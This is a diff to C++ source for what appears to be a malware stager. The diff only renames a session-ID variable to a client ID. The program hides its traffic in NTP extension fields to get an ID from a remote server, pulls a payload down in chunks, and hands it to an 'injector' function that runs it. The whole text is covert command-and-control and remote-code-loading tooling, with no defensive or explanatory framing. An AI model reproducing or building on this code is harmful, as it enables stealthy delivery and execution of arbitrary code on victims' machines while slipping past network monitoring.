@@ -19,7 +19,7 @@ std::vector<uint8_t> size_tToBytes(size_t value) {
 	return bytes;
 }
 
-std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> sessionId) {
+std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
 	std::cout << "======================" << std::endl;
 	std::cout << "Started Chunking		" << std::endl;
 	std::cout << "======================" << std::endl;
@@ -38,12 +38,12 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 	*/
 	auto packetToNotifyServerOfSize = NTPPacket();
 	auto incomingSize = size_tToBytes(dataSize);
-	//std::vector<uint8_t> emptySessionId = { 0xFF, 0xFF, 0xFF, 0xFF };
+	//std::vector<uint8_t> emptyClientId = { 0xFF, 0xFF, 0xFF, 0xFF };
 
 	packetToNotifyServerOfSize.addExtensionField(
 		NtpExtensionField::sizePacket, //NtpExtensionField::giveMePayload,
 		incomingSize,
-		sessionId
+		clientId
 	);
 	std::cout << "[?] Sending size packet " << std::endl;
 	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
@@ -69,7 +69,7 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 		packet.addExtensionField(
 			extensionField, //NtpExtensionField::giveMePayload,
 			chunkData,
-			sessionId //REPLACE ME WITH REAL SESSION ID
+			clientId //REPLACE ME WITH REAL SESSION ID
 		);
 
 		//pass full ntp packet 
@@ -111,7 +111,7 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 /*
 * helper to get payload 
 */
-std::vector<uint8_t> getPayload(std::vector<uint8_t> sessionId) {
+std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 	//Create pcaket
 	auto packet = NTPPacket();
 	//packet.printPacket();
@@ -124,7 +124,7 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> sessionId) {
 	//std::vector<uint8_t> payloadBuffer = chunker(
 	//	packetData,
 	//	NtpExtensionField::giveMePayload,
-	//	Client::emptySessionId
+	//	Client::emptyClientId
 	//);
 	// 
 	// 
@@ -139,7 +139,7 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> sessionId) {
 	giveMePayloadPacketClass.addExtensionField(
 		NtpExtensionField::giveMePayload,
 		packetData,
-		sessionId //placeholder until real id
+		clientId //placeholder until real id
 
 	);
 	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
@@ -172,7 +172,7 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> sessionId) {
 	getMoreOfPayloadPacketClass.addExtensionField(
 		NtpExtensionField::giveMePayload,
 		zeroPacketData,
-		sessionId //placeholder until real id
+		clientId //placeholder until real id
 	);
 	std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();
 
@@ -209,14 +209,14 @@ std::vector<uint8_t> getId() {
 	giveMePayloadPacketClass.addExtensionField(
 		NtpExtensionField::getIdPacket,
 		packetData,
-		Client::emptySessionId
+		Client::emptyClientId
 	);
 	std::vector<uint8_t> giveMePayloadPacket = giveMePayloadPacketClass.getPacket();
 	std::vector<uint8_t> responsePacket = sendChunk(giveMePayloadPacket);
 
 	NTPPacketParser responsePacketParser = NTPPacketParser(responsePacket);
 	//Get extension data:
-	//std::vector<uint8_t> extensionData = responsePacketParser.getExtensionSessionId();
+	//std::vector<uint8_t> extensionData = responsePacketParser.getExtensionClientId();
 	std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();
 
 
@@ -231,10 +231,10 @@ int main() {
 	//0. Get Session ID from server
 	//std::cout << "[?] Session ID: ";
 	//printHexVector(getId());
-	std::vector<uint8_t> sessionId = getId();
+	std::vector<uint8_t> clientId = getId();
 
 	//1. Get Payload
-	std::vector<uint8_t> payloadBytes = getPayload(sessionId);
+	std::vector<uint8_t> payloadBytes = getPayload(clientId);
 
 	//2. run payload
 	injector(payloadBytes);
